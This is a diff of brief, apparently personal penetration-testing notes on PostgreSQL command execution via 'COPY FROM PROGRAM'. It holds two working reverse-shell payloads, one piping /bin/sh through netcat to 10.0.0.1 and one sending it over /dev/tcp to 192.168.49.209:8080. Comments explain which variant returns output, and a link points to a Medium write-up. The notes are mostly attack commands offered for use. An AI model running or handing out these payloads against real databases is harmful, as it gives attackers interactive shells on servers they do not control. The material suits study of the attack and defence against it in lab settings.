@@ -23,7 +23,17 @@ From the first Line we have pg_execute_server_program
 #To get a shell:
 	CREATE TABLE shell(output text);
 	COPY shell FROM PROGRAM ‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc 10.0.0.1 1234 >/tmp/f’;
+										    ###Replace this###
+										    This does not work
+										    with bash -i &> /dev/tcp ... trick, it does not give output
+										    not sure how msfconsole work but, if the target does not have
+										    nc, we need to upload or using metasploit to exploit
 
+	COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f| /bin/sh -i >& /dev/tcp/192.168.49.209/8080 0>&1';   
+								     ###############################################
+								     this works with the bash trick
+								     remove the >/tmp/f at the end;
+								     and discard the | nc 10.0.0.1 1234 part
 
 #Full details here:
 https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767
